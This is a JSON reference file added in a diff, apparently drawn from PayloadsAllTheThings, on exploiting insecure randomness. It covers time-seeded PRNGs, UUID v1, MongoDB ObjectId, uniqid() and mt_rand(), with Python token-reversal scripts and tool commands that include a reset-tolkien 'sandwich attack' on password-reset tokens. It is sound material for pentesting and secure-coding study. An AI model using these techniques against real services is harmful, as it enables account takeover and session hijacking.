@@ -1,0 +1,149 @@
+{
+  "category": "Insecure Randomness",
+  "source": "PayloadsAllTheThings/Insecure Randomness/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What insecure randomness is",
+      "language": "text",
+      "tags": ["methodology", "prng"],
+      "body": "Insecure randomness occurs when the source of entropy or the way random values are generated is not sufficiently unpredictable. This leads to predictable output values that an attacker can compute - and thereby bypass access control, hijack a session, or forge a token.\n\nCommon weak methods: time-based seed, GUID/UUID, MongoDB ObjectId, the uniqid() function, as well as custom algorithms built on top of rand()/mt_rand()."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Where to look for predictable randomness",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "• Password reset tokens - the most common target.\n• Session identifiers, CSRF tokens, OTP/2FA codes.\n• Invite links, email confirmation tokens, API keys.\n• Any \"unique\" object IDs (orders, files, documents) - IDOR via prediction.\n• Signs of a weak PRNG: the token is short, looks like hex of a timestamp, increases monotonically between two requests, changes over time rather than randomly.\n• Capture two or three values in a row with a minimal interval - that makes it easier to recover the seed/state."
+    },
+    {
+      "subcategory": "Time-Based Seeds",
+      "title": "Seed from current time (predictable)",
+      "language": "python",
+      "tags": ["python", "seed", "time-based"],
+      "body": "import random\nimport time\n\nseed = int(time.time())\nrandom.seed(seed)\nprint(random.randint(1, 100))",
+      "meta": {
+        "tip": "The PRNG is seeded with the current time, so the result is predictable for anyone who knows or can estimate the seed value."
+      }
+    },
+    {
+      "subcategory": "Time-Based Seeds",
+      "title": "Recovering the value from a known time",
+      "language": "python",
+      "tags": ["python", "seed", "exploitation"],
+      "body": "import random\nimport time\n\n# Seed based on the provided timestamp\nseed = int(time.mktime(time.strptime('2024-11-10 13:37', '%Y-%m-%d %H:%M')))\nrandom.seed(seed)\n\n# Generate the random number\nprint(random.randint(1, 100))",
+      "meta": {
+        "tip": "Knowing the exact generation time (for example 2024-11-10 13:37), an attacker recreates the same seed and regenerates the correct random value."
+      }
+    },
+    {
+      "subcategory": "GUID / UUID",
+      "title": "What a GUID/UUID is",
+      "language": "text",
+      "tags": ["guid", "uuid", "methodology"],
+      "body": "A GUID (Globally Unique Identifier) / UUID is a 128-bit number for unique identification, usually written as hex groups separated by hyphens, for example 550e8400-e29b-41d4-a716-446655440000.\n\nVersion identification: xxxxxxxx-xxxx-Mxxx-Nxxx-xxxxxxxxxxxx - the 4-bit field M and the 1-3-bit field N encode the format of the UUID itself. Version 1 (time- and MAC-based) is predictable and attackable."
+    },
+    {
+      "subcategory": "GUID / UUID",
+      "title": "GUID/UUID versions",
+      "language": "table",
+      "tags": ["guid", "uuid", "versions"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Version", "Description"],
+          "rows": [
+            ["0", "Only 00000000-0000-0000-0000-000000000000"],
+            ["1", "based on time or clock sequence"],
+            ["2", "reserved in RFC 4122, but omitted in many implementations"],
+            ["3", "based on MD5 hash"],
+            ["4", "generated randomly"],
+            ["5", "based on SHA1 hash"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "GUID / UUID",
+      "title": "guidtool - analysis and attack on UUID v1",
+      "language": "text",
+      "tags": ["guid", "uuid", "tools"],
+      "body": "# https://github.com/intruder-io/guidtool — inspection and attack on version 1 GUIDs\n\n$ guidtool -i 95f6e264-bb00-11ec-8833-00155d01ef00\nUUID version: 1\nUUID time: 2022-04-13 08:06:13.202186\nUUID timestamp: 138691299732021860\nUUID node: 91754721024\nUUID MAC address: 00:15:5d:01:ef:00\nUUID clock sequence: 2099\n\n$ guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000",
+      "meta": {
+        "tip": "From a UUID v1 you can pull the generation time and MAC address. Knowing the approximate time the token was issued, the -t flag sets the reference point, and -p is the number of candidates for brute-forcing neighboring values."
+      }
+    },
+    {
+      "subcategory": "Mongo ObjectId",
+      "title": "Mongo ObjectId structure (predictability)",
+      "language": "text",
+      "tags": ["mongodb", "objectid", "methodology"],
+      "body": "A 12-byte ObjectId is generated predictably and consists of:\n\n• Timestamp (4 bytes): creation time in seconds since the Unix epoch (January 1, 1970).\n• Machine Identifier (3 bytes): machine identifier (from hostname/IP) - predictable for documents from a single machine.\n• Process ID (2 bytes): MongoDB process identifier - predictable for documents of a single process.\n• Counter (3 bytes): a counter, incremented for each new ObjectId. It is initialized randomly when the process starts, but after that the values run sequentially and predictably.\n\nExample tokens: 5ae9b90a2c144b9def01ec37, 5ae9bac82c144b9def01ec39"
+    },
+    {
+      "subcategory": "Mongo ObjectId",
+      "title": "mongo-objectid-predict - predicting the next IDs",
+      "language": "text",
+      "tags": ["mongodb", "objectid", "tools"],
+      "body": "# https://github.com/andresriancho/mongo-objectid-predict — predicting Mongo ObjectId\n\n./mongo-objectid-predict 5ae9b90a2c144b9def01ec37\n5ae9bac82c144b9def01ec39\n5ae9bacf2c144b9def01ec3a\n5ae9bada2c144b9def01ec3b",
+      "meta": {
+        "tip": "Having one valid ObjectId, the tool predicts the next ones - a path to IDOR when object references are built on ObjectId."
+      }
+    },
+    {
+      "subcategory": "Mongo ObjectId",
+      "title": "Parsing an ObjectId into timestamp/process/counter",
+      "language": "python",
+      "tags": ["mongodb", "objectid", "python"],
+      "body": "def MongoDB_ObjectID(timestamp, process, counter):\n    return \"%08x%10x%06x\" % (\n        timestamp,\n        process,\n        counter,\n    )\n\ndef reverse_MongoDB_ObjectID(token):\n    timestamp = int(token[0:8], 16)\n    process = int(token[8:18], 16)\n    counter = int(token[18:24], 16)\n    return timestamp, process, counter\n\n\ndef check(token):\n    (timestamp, process, counter) = reverse_MongoDB_ObjectID(token)\n    return token == MongoDB_ObjectID(timestamp, process, counter)\n\ntokens = [\"5ae9b90a2c144b9def01ec37\", \"5ae9bac82c144b9def01ec39\"]\nfor token in tokens:\n    (timestamp, process, counter) = reverse_MongoDB_ObjectID(token)\n    print(f\"{token}: {timestamp} - {process} - {counter}\")"
+    },
+    {
+      "subcategory": "Uniqid",
+      "title": "uniqid is based on a timestamp (reversible)",
+      "language": "text",
+      "tags": ["uniqid", "php", "methodology"],
+      "body": "Tokens obtained via uniqid are based on a timestamp and are therefore reversible.\n\nImplementations to study:\n• https://github.com/Riamse/python-uniqid/blob/master/uniqid.py — based on timestamp\n• https://github.com/php/php-src/blob/master/ext/standard/uniqid.c\n\nExample tokens:\n• uniqid: 6659cea087cd6, 6659cea087cea\n• sha256(uniqid): 4b26d474c77daf9a94d82039f4c9b8e555ad505249437c0987f12c1b80de0bf4, ae72a4c4cdf77f39d1b0133394c0cb24c33c61c4505a9fe33ab89315d3f5a1e4"
+    },
+    {
+      "subcategory": "Uniqid",
+      "title": "Reversing uniqid → timestamp",
+      "language": "python",
+      "tags": ["uniqid", "python", "exploitation"],
+      "body": "import math\nimport datetime\n\ndef uniqid(timestamp: float) -> str:\n    sec = math.floor(timestamp)\n    usec = round(1000000 * (timestamp - sec))\n    return \"%8x%05x\" % (sec, usec)\n\ndef reverse_uniqid(value: str) -> float:\n    sec = int(value[:8], 16)\n    usec = int(value[8:], 16)\n    return float(f\"{sec}.{usec}\")\n\ntokens = [\"6659cea087cd6\" , \"6659cea087cea\"]\nfor token in tokens:\n    t = float(reverse_uniqid(token))\n    d = datetime.datetime.fromtimestamp(t)\n    print(f\"{token} - {t} => {d}\")",
+      "meta": {
+        "tip": "If a reset/invite token looks like a 13-character hex string, it is probably uniqid(). Reversing it gives the exact generation time, after which you can brute-force the neighboring time values."
+      }
+    },
+    {
+      "subcategory": "mt_rand",
+      "title": "Recovering the mt_rand() seed from two outputs",
+      "language": "text",
+      "tags": ["mt_rand", "php", "tools"],
+      "body": "# Breaking mt_rand() with two output values and no bruteforce.\n# https://github.com/ambionics/mt_rand-reverse\n\n./display_mt_rand.php 12345678 123\n712530069 674417379\n\n./reverse_mt_rand.py 712530069 674417379 123 1",
+      "meta": {
+        "tip": "The script recovers the mt_rand() seed from just two outputs and without brute-forcing. The arguments to reverse_mt_rand.py are the two obtained values and the lower/upper bounds of the range."
+      }
+    },
+    {
+      "subcategory": "Custom Algorithms",
+      "title": "Custom randomness algorithms (antipatterns)",
+      "language": "php",
+      "tags": ["php", "custom", "antipattern"],
+      "body": "$token = md5($emailId).rand(10,9999);\n$token = md5(time()+123456789 % rand(4000, 55000000));",
+      "meta": {
+        "tip": "Writing your own randomness generator is not recommended. These are real examples from GitHub/StackOverflow found in production: md5 of a known email + weak rand(), or a complete dependence on time() - all of it is predictable."
+      }
+    },
+    {
+      "subcategory": "Custom Algorithms",
+      "title": "reset-tolkien - detection and sandwich attack",
+      "language": "text",
+      "tags": ["tools", "time-based", "sandwich"],
+      "body": "# Generic identification and sandwich attack\n# https://github.com/AethliosIK/reset-tolkien\n\nreset-tolkien detect 660430516ffcf -d \"Wed, 27 Mar 2024 14:42:25 GMT\" --prefixes \"attacker@example.com\" --suffixes \"attacker@example.com\" --timezone \"-7\"\nreset-tolkien sandwich 660430516ffcf -bt 1711550546.485597 -et 1711550546.505134 -o output.txt --token-format=\"uniqid\"",
+      "meta": {
+        "tip": "Sandwich attack: you trigger generation of the victim's token between two of your own requests with known times (-bt start, -et end), then brute-force all time values within this narrow window. reset-tolkien automates format detection and the brute-forcing itself."
+      }
+    }
+  ]
+}
